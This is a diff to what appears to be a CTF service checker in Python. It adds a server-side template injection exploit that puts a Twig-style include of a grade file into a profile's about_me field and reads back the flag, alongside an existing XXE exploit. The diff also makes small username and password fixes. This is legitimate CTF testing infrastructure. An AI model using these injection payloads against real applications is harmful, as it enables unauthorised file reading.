@@ -117,6 +117,10 @@ def generate_xxe_payload(filename: str):
         <description>&xxe;</description>
     </course>
 </data>""")
+            
+
+def generate_ssti_payload(filename: str):
+    return (f"{{% include 'grades/{filename}' %}}")
 
 """
 Checker functions
@@ -243,7 +247,7 @@ async def exploit_mass_assign(
 
     # register user and login
     username, password = noise(10, 15), noise(16, 20)
-    data = {"username": "exploiter_" + username, "password": password}
+    data = {"username": "exploiter0_" + username, "password": password}
     r = await client.post("/index.php?action=register", data=data)
     assert_status_code(logger, r, 302, "Register failed", info=data)
 
@@ -278,7 +282,7 @@ async def exploit_xxe(
 
     # register user and login
     username, password = noise(10, 15), noise(16, 20)
-    data = {"username": "exploiter_" + username, "password": "pass"}
+    data = {"username": "exploiter1_" + username, "password": password}
     r = await client.post("/index.php?action=register", data=data)
     assert_status_code(logger, r, 302, "Register failed", info=data)
 
@@ -297,6 +301,42 @@ async def exploit_xxe(
     flag = searcher.search_flag(r.text)
     if flag is not None:
         return flag
+
+
+@checker.exploit(2)
+async def exploit_ssti(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    client: AsyncClient,
+    logger: LoggerAdapter,
+) -> Optional[str]:
+    assert_equals(type(task.attack_info), str, "attack info missing")
+
+    assert_equals(len(task.attack_info.split()), 5)
+
+    # Attack info is in the form of "User {username} Uploaded Grade {filename}"
+    _, _, _, _, filename = task.attack_info.split()
+
+    # register user and login
+    username, password = noise(10, 15), noise(16, 20)
+    data = {"username": "exploiter2_" + username, "password": password}
+    r = await client.post("/index.php?action=register", data=data)
+    assert_status_code(logger, r, 302, "Register failed", info=data)
+
+    # exploit ssti in update profile
+    data = {"about_me": generate_ssti_payload(filename)}
+    r = await client.post("/index.php?action=profile", data=data)
+    assert_status_code(
+        logger, r, 200, "Update about_me in update Profile failed", info=data
+    )
+
+    # get flag
+    r = await client.get(f"/index.php?action=profile")
+    assert_status_code(logger, r, 200, "Flaguser profile missing", info=data)
+    flag = searcher.search_flag(r.text)
+    if flag is not None:
+        return flag
+
 
 
 if __name__ == "__main__":
